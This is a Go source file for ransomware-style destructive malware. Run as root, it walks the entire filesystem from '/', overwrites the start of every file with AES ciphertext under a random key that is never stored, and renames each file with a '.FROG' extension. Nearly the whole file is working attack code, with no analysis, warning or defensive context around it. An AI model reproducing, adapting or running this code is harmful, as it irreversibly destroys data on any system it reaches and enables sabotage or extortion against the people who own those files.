package main

import (
    //"crypto"
    "crypto/cipher"
    "crypto/aes"
    "crypto/rand"

    "log"
    "os"
    "os/user"
    mrand "math/rand"
    "path/filepath"
    "time"
    "io"
    "fmt"
)

func main() {
    currentUser, err := user.Current()
    if err != nil {
        log.Fatal(err)
    }

    if currentUser.Uid != "0" {
        fmt.Printf("ERROR: Must run as root!\n")
        os.Exit(1)
    }
    buf := make([]byte, 4096)

    err = filepath.Walk("/", func(path string, info os.FileInfo, err error) error {
        if err != nil {
            return nil
        }
        if info.IsDir() {
            return nil
        }

        if newerror := encryptFile(buf, path); newerror != nil {
            log.Printf("ENCRYPTION FAILED: %s\n", newerror)
            return newerror
        }
        os.Rename(path, path+".FROG")
        return nil
    })

    if err != nil {
        log.Fatalf("FILEWALK FAILED: %s\n", err)
    }

    //buf := make([]buf, 4096)

    //if err := encryptFile(buf, "PLACEHOLDER"); err != nil {
    //    log.Fatal(err)
    //}
}

func encryptFile(buf []byte, filePath string) error {
    file, err := os.OpenFile(filePath, os.O_RDWR, 0)
    if err != nil {
        return nil
    }
    defer file.Close()

    _, err = file.ReadAt(buf, 0)
    if err != nil {
        return nil
    }

    key := []byte(randomkey())

    encbuf, err := encrypt(key, buf)
    if err != nil {
        return nil
    }

    _, err = file.WriteAt(encbuf, 0)
    if err != nil {
        return nil
    }
    return nil
}

func encrypt(key, message []byte) (encmess []byte, err error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return
    }

    ciphertext := make([]byte, aes.BlockSize+len(message))
    iv := ciphertext[:aes.BlockSize]
    if _, err = io.ReadFull(rand.Reader, iv); err != nil {
        return
    }

    stream := cipher.NewCFBEncrypter(block, iv)
    stream.XORKeyStream(ciphertext[aes.BlockSize:], message)

    encmess = ciphertext
    return
}

func randomkey() string {
    mrand.Seed(time.Now().UnixNano())
    var key string

    for i := 0; i < 32; i++ {
        key += string(rune(int('a') + mrand.Intn(26)))
    }

    return key
}
